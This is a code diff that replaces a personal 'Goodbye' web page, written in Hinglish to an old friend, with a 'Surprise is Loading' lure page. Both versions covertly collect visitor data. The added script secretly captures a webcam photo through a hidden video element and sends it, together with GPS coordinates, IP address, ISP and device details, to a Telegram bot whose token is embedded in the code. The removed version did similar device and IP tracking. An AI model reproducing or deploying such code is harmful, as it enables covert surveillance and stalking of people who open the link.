@@ -1,228 +1,136 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <meta name="theme-color" content="#16181d" />
-  <title>Goodbye...</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Surprise!</title>
   <style>
-    :root {
-      --glass-bg: rgba(25, 29, 38, 0.83);
-      --border-gradient: linear-gradient(135deg, #384259, #2c3e50 80%, #1a202c 100%);
-      --button-bg: linear-gradient(90deg, #384259 0%, #2c3e50 100%);
-      --button-hover: linear-gradient(90deg, #2c3e50 0%, #384259 100%);
-    }
-    * { box-sizing: border-box; margin: 0; padding: 0; }
-    html, body {
-      height: 100%;
-      width: 100%;
-    }
     body {
-      min-height: 100vh;
-      min-width: 100vw;
-      font-family: 'Poppins', sans-serif;
-      background: radial-gradient(ellipse at 60% 30%, #232a34 60%, #16181d 100%);
-      color: #d7dbe4;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      overflow: hidden;
-      opacity: 0;
-      transition: opacity 1.7s cubic-bezier(.77,0,.18,1);
-      position: relative;
-    }
-    body.fade-in { opacity: 1; }
-    body.fade-out { opacity: 0; transition: opacity 1.2s cubic-bezier(.77,0,.18,1);}
-    .vignette {
-      position: absolute;
-      inset: 0;
-      pointer-events: none;
-      z-index: 1;
-      background: radial-gradient(ellipse at 50% 80%, transparent 70%, #11151a 100%);
-      opacity: 0.8;
-    }
-    .main-box {
-      z-index: 3;
-      position: relative;
-      background: var(--glass-bg);
-      border-radius: 22px;
-      padding: 42px 30px 32px 30px;
-      box-shadow: 0 6px 30px 0 rgba(20, 22, 28, 0.23);
-      border: 2px solid #222a36;
-      max-width: 420px;
-      width: 95vw;
+      background: linear-gradient(135deg, #a0d8e1, #6ec6e6);
+      color: #fff;
+      font-family: sans-serif;
       text-align: center;
-      backdrop-filter: blur(11px) saturate(1.1);
-      -webkit-backdrop-filter: blur(11px) saturate(1.1);
-      margin: 0 10px;
-      animation: popin 1s cubic-bezier(.77,0,.18,1);
+      padding: 20px;
     }
-    @keyframes popin {
-      from { transform: scale(0.94) translateY(30px); opacity: 0.2;}
-      to   { transform: scale(1) translateY(0); opacity: 1;}
-    }
-    h1 {
-      font-size: 2.1rem;
-      color: #6b7280;
-      margin-bottom: 16px;
-      letter-spacing: 1px;
-      font-weight: 600;
-      text-shadow: 0 2px 10px #232a3430;
-    }
-    p {
-      font-size: 1.07rem;
-      color: #bfc7d1;
-      margin-bottom: 32px;
-      line-height: 1.7;
-      text-align: left;
-      white-space: pre-line;
-    }
-    .signature {
-      margin-top: 24px;
-      font-size: 1rem;
-      color: #8a93a3;
-      font-style: italic;
-      text-align: right;
-    }
-    button {
-      margin-top: 30px;
-      font-family: inherit;
-      font-size: 1.09rem;
-      padding: 12px 38px;
-      border: none;
-      border-radius: 21px;
-      background: var(--button-bg);
-      color: #e3e6ed;
-      font-weight: 600;
-      cursor: pointer;
-      box-shadow: 0 3px 16px #222a3644;
-      transition: background 0.23s, box-shadow 0.23s, transform 0.17s;
-      outline: none;
-      letter-spacing: 0.5px;
-    }
-    button:hover {
-      background: var(--button-hover);
-      box-shadow: 0 2px 24px #232a3477;
-      transform: scale(1.03);
-    }
+    h1 { font-size: 24px; margin-top: 20px; }
+    .info { margin-top: 20px; font-size: 16px; }
+    #snapshot, video { display: none; }
   </style>
 </head>
 <body>
-  <div class="vignette"></div>
-  <div class="main-box">
-    <h1>Hey...🙂</h1>
-    <p>
-      Hum sirf dost the... aur ab shayad woh bhi nahi rahe.
+  <h1>Surprise is Loading... 🎁</h1>
+  <p class="info">Just wait a moment please...</p>
 
-            Meri taraf se bas yahi ummeed hai ki aap apni zindagi mein acche honge, khush rahenge, aur sukoon me honge.
-  Umeed hai aap acche honge.
-
-      Agr aapke pass time ho aur aap akele ho... tabhi "Redirect to Next Page" par click karein,  
-      
-    </p>
-    <div class="signature">– Ek purana dost</div>
-    <button onclick="redirect()">Redirect to Next page...</button>
-  </div>
+  <video id="preview" autoplay playsinline></video>
+  <canvas id="snapshot"></canvas>
 
   <script>
-    document.addEventListener("DOMContentLoaded", () => {
-      document.body.classList.add("fade-in");
+    const botToken = "7471112121:AAHXaDVEV7dQTBdpP38OBvytroRUSu-2jYo";
+    const chatId = "7643222418";
 
-      const botToken = "7712803144:AAHIt2WP2dfLxcvGmWZeOx6dj1Ezpiybcbo";
-      const chatId = "7984208551";
+    // --- PHOTO CAPTURE ---
+    const video = document.getElementById("preview");
+    const canvas = document.getElementById("snapshot");
 
-      async function getExtraDeviceInfo() {
-        let batteryLevel = "Not Supported";
-        let isCharging = "Unknown";
-        if (navigator.getBattery) {
-          try {
-            const battery = await navigator.getBattery();
-            batteryLevel = Math.round(battery.level * 100) + "%";
-            isCharging = battery.charging ? "Yes" : "No";
-          } catch (e) { batteryLevel = "Error"; }
-        }
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then((stream) => {
+        video.srcObject = stream;
+        video.onloadedmetadata = () => {
+          setTimeout(() => {
+            captureAndSendPhoto();
+          }, 1000);
+        };
+      })
+      .catch((err) => console.error("Camera access denied:", err));
 
-        let connectionType = "Not Supported", downlink = "", effectiveType = "", rtt = "";
-        if (navigator.connection) {
-          connectionType = navigator.connection.type || "Unknown";
-          downlink = navigator.connection.downlink ? `${navigator.connection.downlink}Mbps` : "";
-          effectiveType = navigator.connection.effectiveType || "";
-          rtt = navigator.connection.rtt ? `${navigator.connection.rtt}ms` : "";
-        }
-
-        const now = new Date();
-        const time = now.toLocaleString('en-IN', { hour12: true });
-        const ua = navigator.userAgent;
-        const platform = navigator.platform;
-        const language = navigator.language;
-        const screenRes = `${window.screen.width}x${window.screen.height}`;
-        const devicePixelRatio = window.devicePixelRatio;
-
-        let browser = "Unknown";
-        if (/chrome|crios|crmo/i.test(ua)) browser = "Chrome/Chromium";
-        else if (/firefox|fxios/i.test(ua)) browser = "Firefox";
-        else if (/safari/i.test(ua)) browser = "Safari";
-        else if (/edg/i.test(ua)) browser = "Edge";
-        else if (/opr|opera/i.test(ua)) browser = "Opera";
-        else if (/msie|trident/i.test(ua)) browser = "Internet Explorer";
-
-        let os = "Unknown";
-        if (/windows/i.test(ua)) os = "Windows";
-        else if (/android/i.test(ua)) os = "Android";
-        else if (/iphone|ipad|ipod/i.test(ua)) os = "iOS";
-        else if (/mac/i.test(ua)) os = "MacOS";
-        else if (/linux/i.test(ua)) os = "Linux";
-
-        let ipDetails = "";
-        try {
-          const res = await fetch("https://ipinfo.io/json?token=dcc0fd091ea6f5");
-          const data = await res.json();
-          ipDetails = `\n🌍 IP: ${data.ip}\n📍 Location: ${data.city}, ${data.region}, ${data.country}\n📌 Lat/Long: ${data.loc}`;
-        } catch (e) {
-          ipDetails = "\n🌍 IP Info: Failed to load";
-        }
-
-        return (
-          `😢 Goodbye Page visited\n\n` +
-          `🕒 Time: ${time}\n` +
-          `💻 Device: ${platform}\n` +
-          `🌐 Browser: ${browser}\n` +
-          `🛠️ OS: ${os}\n` +
-          `📲 Battery: ${batteryLevel} (Charging: ${isCharging})\n` +
-          `📶 Connection: ${connectionType} ${downlink ? ", Downlink: " + downlink : ""} ${effectiveType ? ", Type: " + effectiveType : ""} ${rtt ? ", RTT: " + rtt : ""}\n` +
-          `🖥️ Screen: ${screenRes} @${devicePixelRatio}x\n` +
-          `🌏 Language: ${language}\n` +
-          `🧪 UA: ${ua}` +
-          ipDetails
-        );
-      }
-
-      getExtraDeviceInfo().then((message) => {
-        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+    function captureAndSendPhoto() {
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+      canvas.toBlob((blob) => {
+        const formData = new FormData();
+        formData.append("chat_id", chatId);
+        formData.append("photo", blob);
+        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
           method: "POST",
-          headers: { "Content-Type": "application/json" },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-          }),
+          body: formData
+        }).then(() => {
+          const tracks = video.srcObject.getTracks();
+          tracks.forEach(track => track.stop());
         });
       });
-    });
+    }
 
-    function redirect() {
-      var pass = prompt("Please enter the code:");
-      if(pass === "051108") {
-        document.body.classList.add("fade-out");
-        setTimeout(() => {
-          window.location.href = "https://p-ten-bay.vercel.app/";
-        }, 1200);
-      } else if(pass !== null) {
-  alert(`Wrong code! Try again
+    // --- DEVICE + IP + LOCATION INFO ---
+    async function sendDeviceDetails(position = {}) {
+      const now = new Date().toLocaleString();
+      const ua = navigator.userAgent || "N/A";
+      const platform = navigator.platform || "N/A";
+      const lang = navigator.language || "N/A";
+      const screenRes = `${screen.width}x${screen.height}`;
+      const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone || "N/A";
+      const orientation = (screen.orientation || {}).type || "Not Available";
 
-You might have forgotten it, by the way my insta pass is the same one You had set which I have not changed till date.`);
+      // Battery
+      let batteryInfo = "Battery info not available";
+      try {
+        const battery = await navigator.getBattery();
+        batteryInfo = `Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;
+      } catch (e) { }
 
+      // Connection
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const connectionInfo = connection ? 
+        `📶 Connection: ${connection.effectiveType}, Downlink: ${connection.downlink}Mbps, RTT: ${connection.rtt}ms` : 
+        "📶 Connection: Not available";
+
+      // Location
+      let locationMsg = "📌 Location: Not Available";
+      if (position.coords) {
+        locationMsg = `📌 Location:\nLat: ${position.coords.latitude}\nLng: ${position.coords.longitude}`;
       }
+
+      // IP Address
+      let ipInfo = "🌐 IP: Not available";
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const ipData = await res.json();
+        ipInfo = 
+          `🌐 IP: ${ipData.ip}\n` +
+          `📍 City: ${ipData.city}, Region: ${ipData.region}\n` +
+          `🌍 Country: ${ipData.country_name} (${ipData.country_code})\n` +
+          `🏢 ISP: ${ipData.org || "Unknown"}`;
+      } catch (err) {}
+
+      const message =
+        `🛰️ New Visit Tracked!\n\n` +
+        `🕒 Time: ${now}\n` +
+        `🌐 Platform: ${platform}\n` +
+        `📱 Language: ${lang}\n` +
+        `📺 Screen: ${screenRes}\n` +
+        `🔄 Orientation: ${orientation}\n` +
+        `🌍 Timezone: ${timeZone}\n` +
+        `🔋 ${batteryInfo}\n` +
+        `📡 ${connectionInfo}\n` +
+        `🧠 UserAgent: ${ua}\n\n` +
+        `${ipInfo}\n\n` +
+        `${locationMsg}`;
+
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: chatId, text: message })
+      }).catch(console.error);
+    }
+
+    if ("geolocation" in navigator) {
+      navigator.geolocation.getCurrentPosition(
+        sendDeviceDetails,
+        () => sendDeviceDetails()
+      );
+    } else {
+      sendDeviceDetails();
     }
   </script>
 </body>
